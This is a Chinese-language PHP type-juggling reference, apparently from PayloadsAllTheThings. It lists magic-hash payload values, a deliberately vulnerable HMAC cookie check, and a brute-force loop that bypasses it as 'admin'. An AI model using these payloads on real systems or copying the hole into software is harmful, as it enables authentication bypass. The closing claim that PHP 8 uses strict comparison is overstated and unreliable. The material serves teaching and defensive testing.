# Type Juggling - PHP类型混淆

[SEARCH_KEYWORDS]
漏洞类型: Type Juggling 类型混淆 类型转换 Loose Comparison
攻击类型: Authentication Bypass Authorization Bypass Hash Collision
关键词: PHP type juggling loose comparison strict comparison magic hash
运算符: == != === !== comparison operator
技术: Magic Hash 0e Hash Collision NULL Comparison Type Coercion

[CONTENT]

## 类型混淆概述

PHP是弱类型语言，会自动将变量转换为不同类型。这种自动转换(类型混淆)在使用`==`比较时可能导致意外结果。

## 比较类型

- **宽松比较**：`==` 或 `!=`：只比较值
- **严格比较**：`===` 或 `!==`：比较类型和值

## 宽松比较真值表

| 语句 | 结果 |
|------|------|
| `'0010e2' == '1e3'` | true |
| `'0xABCdef' == ' 0xABCdef'` | true (PHP 5.0) / false (PHP 7.0) |
| `'123' == 123` | true |
| `'123a' == 123` | true |
| `'abc' == 0` | true |
| `'' == 0 == false == NULL` | true |
| `'' == 0` | true |
| `0 == false` | true |
| `false == NULL` | true |

## NULL语句

| 函数 | 语句 | 结果 |
|------|------|------|
| sha1 | `var_dump(sha1([]));` | NULL |
| md5 | `var_dump(md5([]));` | NULL |

## Magic Hashes

当哈希以"0e"开头且后跟数字时，PHP将其视为科学计数法(0的幂)。

### MD5 Magic Hashes

| 值 | Hash |
|----|------|
| 240610708 | 0e462097431906509019562988736854 |
| QNKCDZO | 0e830400451993494058024219903391 |
| 0e1137126905 | 0e291659922323405260514745084877 |
| 0e215962017 | 0e291242476940776845150308577824 |

### SHA1 Magic Hashes

| 值 | Hash |
|----|------|
| 10932435112 | 0e07766915004133176347055865026311692244 |

### 利用示例

```php
<?php
var_dump(md5('240610708') == md5('QNKCDZO')); # bool(true)
var_dump(md5('aabg7XSs') == md5('aabC9RqS'));
var_dump(sha1('aaroZmOk') == sha1('aaK1STfY'));
var_dump(sha1('aaO8zKZF') == sha1('aa3OFF9m'));
?>
```

## 漏洞利用示例

```php
function validate_cookie($cookie,$key){
    $hash = hash_hmac('md5', $cookie['username'] . '|' . $cookie['expiration'], $key);
    if($cookie['hmac'] != $hash){ // loose comparison vulnerability
        return false;
    }
    else{
        echo "Well done";
    }
}
```

### 利用步骤

1. 准备恶意Cookie：username=admin, expiration=未来时间戳, hmac=0
2. 暴力破解expiration直到hash以"0e"开头
3. 更新Cookie使用找到的值

```php
for($i=1424869663; $i < 1835970773; $i++ ){
    $out = hash_hmac('md5', 'admin|'.$i, '');
    if(str_starts_with($out, '0e')){
        if($out == 0){
            echo "$i - ".$out;
            break;
        }
    }
}
```

结果：`1539805986 - 0e772967136366835494939987377058`

## PHP 8变化

PHP 8不再将字符串强制转换为数字，使用严格比较。

## 参考文档

原始来源: PayloadsAllTheThings/Type Juggling/README.md